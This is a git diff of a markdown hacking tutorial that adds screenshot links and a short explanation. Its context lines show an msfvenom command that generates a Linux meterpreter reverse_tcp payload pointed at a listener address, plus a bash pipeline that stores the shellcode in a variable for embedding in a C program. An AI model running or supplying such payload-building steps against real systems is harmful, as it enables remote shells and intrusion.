@@ -55,7 +55,7 @@ sudo mkdir shellcode
 cd shellcode
 ```
 
-![pic](http://i64.tinypic.com/2hn3k2f.png)
+![pic](http://i63.tinypic.com/2dl9pop.png)
 
 <br />
 
@@ -78,6 +78,8 @@ sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 
 
 ```
 
+![pic](http://i64.tinypic.com/muk5xu.png)
+
 - **'Msfvenom Syntax'**
   - -p payload name
   - -b delete nul bites from shellcode
@@ -93,6 +95,8 @@ sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 
 cat chars.raw
 ```
 
+![pic](http://i66.tinypic.com/i6xzyw.png)
+
 <br />
 
 #### [Parse](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/bash/parsing_data_in_bash.md) shellcode data and store it into a local bash variable
@@ -100,6 +104,12 @@ cat chars.raw
 ```
 pa=$(cat chars.raw | grep -v "=" | tr -d '";' | tr -d '\n' | tr -d ' ')
 ```
+
+![pic](http://i65.tinypic.com/2090m12.png)
+
+The shellcode data its now stored inside a bash local variable named **$pa**<br />
+This variable its going to be used to embebbed the shellcode in to C Program while we<br />
+are creating it using the follow commands described in the next grey box.<br />
 
 <br />
 
